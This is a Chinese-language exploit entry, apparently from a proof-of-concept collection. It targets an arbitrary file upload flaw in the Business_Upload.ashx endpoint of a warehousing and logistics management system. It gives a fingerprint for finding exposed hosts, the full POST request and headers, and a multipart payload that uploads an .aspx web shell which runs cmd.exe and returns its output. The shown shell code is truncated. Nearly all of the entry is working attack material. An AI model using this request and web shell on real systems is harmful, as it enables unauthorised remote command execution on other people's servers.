# 仓储系统和物流管理系统Business_Upload.ashx存在任意文件上传漏洞

- **系统**：仓储系统和物流管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Images/ｆｒａｍｅ/login_title.png"`
- **请求**：`POST /Module_Basic/Customers/Business_Upload.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundary75ee300bb…`　`Priority: u=0`　`Content-Length: 32379`

**请求体 / payload**
```
------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
Content-Disposition: form-data; name="name"
user_tag_template.aspx
------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
Content-Disposition: form-data; name="file"; filename="user_tag_template.aspx"
Content-Type: application/html
<%@ Page Language="Jｓｃｒｉｐｔ" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
…（脚本共 980 字，完整版见原文）
```
- **预期**：200　|　—